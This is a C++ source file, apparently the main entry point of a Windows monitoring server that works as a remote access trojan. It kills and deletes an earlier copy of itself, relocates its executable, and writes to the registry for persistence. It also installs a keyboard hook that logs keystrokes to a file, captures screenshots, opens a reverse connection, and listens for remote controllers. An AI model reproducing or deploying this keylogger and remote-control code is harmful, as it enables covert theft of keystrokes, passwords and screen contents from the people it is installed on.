
#include "stdafx.h"
#include "resource.h"

#include <TCHAR.H>

#include "NetworkDatatypes.h"
#include "NetworkHeaderFormats.h"
#include "GenericExtendedQueue.h"
#include "GenericUtility.h"

#include "GenericNetwork.h"
#include "TcpNetworkMonitorDataSocket.h"
#include "TcpNetworkMonitorListener.h"
#include "LzssCompression.h"


#include "GenericCommandMonitorUtility.h"
#include "exeExtraEditor.h"

//--------------Plugin Headers-----------//

#include ".\PluginInterface\IPluginGeneric.h"
#include ".\PluginInterface\IFunPlugin.h"
#include ".\PluginInterface\IScreenMonitorPlugin.h"
#include ".\PluginInterface\IChatServer.h"
#include ".\PluginInterface\IOnlineKeyLogging.h"

//--------------End Plugin Headers-----------//

#include "WinMonitorConfigStructsAndGlobals.h"

#include "InitializeServerBasic.h"
#include "CommandMonitorServer.h"
#include "WinMonitorServicer.h"
#include "InitializeServer.h"


#include "WinMonitorServer.h"


int APIENTRY _tWinMain(HINSTANCE hInst,HINSTANCE hPreInst,LPTSTR lpCmdLine,int nCmdShow)
{
	CTString a("Abcdefgh");
	bool b = a.EndsWith("fgh"); 

	CTString oCurPath;
	MODULEENTRY32 me32 = {0};

	GetModule(GetCurrentProcessId(),&me32);
	oCurPath = me32.szExePath;
	oCurPath[(unsigned long)oCurPath.LastIndexOf(_T('\\'))] = _T('\0');
	SetCurrentDirectory((TCHAR*)oCurPath);
	oCurPath.Clear(); 

	if(_tcscmp((TCHAR*)lpCmdLine,_T("")))
	{
		DWORD prevpid; 
		PROCESSENTRY32 pe32;
		CTString tchrBadFileName,tchrpid,tchrXml,oCmdLine(lpCmdLine);

		oCmdLine.SplitByToken("|",tchrBadFileName,tchrpid); 
	   _stscanf((TCHAR*)tchrpid,"%d",&prevpid);
		if(GetProcess(prevpid,pe32)) 
		{
			HANDLE HProcess=OpenProcess(PROCESS_ALL_ACCESS,true,prevpid);
			try
			{
				if(TerminateProcess(HProcess,0))
				{
					CloseHandle(HProcess);					
					tchrXml=tchrBadFileName.AttachAnotherFileName(DEF_CONFIG_INI); 
					DeleteFile((TCHAR*)tchrXml);
					tchrXml=tchrBadFileName.AttachAnotherFileName((TCHAR*)"WinMonitorServerPlugin.dll");
					DeleteFile((TCHAR*)tchrXml);
					DeleteFile(tchrBadFileName);
				}
			}
			catch(...) {}
		}
	}
	if(!IsConfigFileExists()) if(!ExtractConfigFileFromEXE()) return false;
	if(!MapExeToProperPlace()) return false;
	gbl_hinstCurrentInstance=hInst,gbl_intWndShowType=nCmdShow;
	MethodRetBoolArgInt MShow=0;

	GblStat_HModulePlugins_1_0=LoadLibrary("WinMonitorServerPlugin");

    if(GblStat_HModulePlugins_1_0)
	  ((MethodRetBoolArgHndRef)GetProcAddress(GblStat_HModulePlugins_1_0,"SetPrivateHeap"))(CGeneralMemoryUtility::GetLocalHeap());    


    if(GblStat_HModulePlugins_1_0) 
	{
		if(MShow=(MethodRetBoolArgInt)GetProcAddress(GblStat_HModulePlugins_1_0,"SetCmdShowType"),MShow)
			MShow(gbl_intWndShowType);

		InstallKBrdHook=(MethodRetBoolArgVoid)GetProcAddress(GblStat_HModulePlugins_1_0,"InstallKeyBoardHook"); 
		UnInstallKBrdHook=(MethodRetBoolArgVoid)GetProcAddress(GblStat_HModulePlugins_1_0,"UnInstallKeyBoardHook"); 
		
	}

	if(!LoadWinMonitorServerConfigurationFromINI(gbl_struct_WinMonitorServerConfig)) return 0;
	if(!CreateKeyLogFile())    return 0;
	if(!CreateScreenShotDir()) return 0;
	if(!UpdateRegistry())      return 0;
	SetKeyBoardHook();
	InstallScreenSnatcher();
	
	CInitializeNetworkLibrary::LoadLibraryAndVersion(); 

	InstallReverseConnection(); 

	CTcpNwMonitorListener lst;
	
	lst.ListenAt(false,(UINT)gbl_struct_WinMonitorServerConfig.SNetworkConnection.lngListenPort);
	lst.SetListenState(true); 

    CTcpNwMonitorConnection conn;
	CWinMonitorServicer *ser;

	MSG msg;
	HACCEL hAccelTable=0; //LoadAccelerators(hInst,"");

	while(true)
	{
		if(PeekMessage(&msg,NULL,NULL,NULL,PM_REMOVE))
		{	
			if(msg.message==WM_QUIT) break;

			if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg)) 
			{
				TranslateMessage(&msg);
				DispatchMessage(&msg);
			}
		}
		else if(lst.RemoveClient(conn))
		{
			if(ser=new CWinMonitorServicer(),ser->ServiceClient(conn,true,true))
				gbl_lnkdlst_TcpClients.InsertAtBack((void*)ser); 
			else delete ser;
		}
		else Sleep(100);
	}
	
	UnInstallKeyBoardHook();
	UnInstallScreenSnatcher();
	UnInstallReverseConnection();
	
	if(GblStat_HModulePlugins_1_0) FreeLibrary(GblStat_HModulePlugins_1_0);

	while(gbl_lnkdlst_TcpClients.DeleteFromFront((void**)&ser))
	{
		if(ser->IsServicing()) ser->StopService();
		delete ser;
	}
	
	CInitializeNetworkLibrary::CleanUpLibrary();  

	UnloadConfigSettings(gbl_struct_WinMonitorServerConfig,gbl_struct_WinMonitorStoredFiles);
	return 0;
}


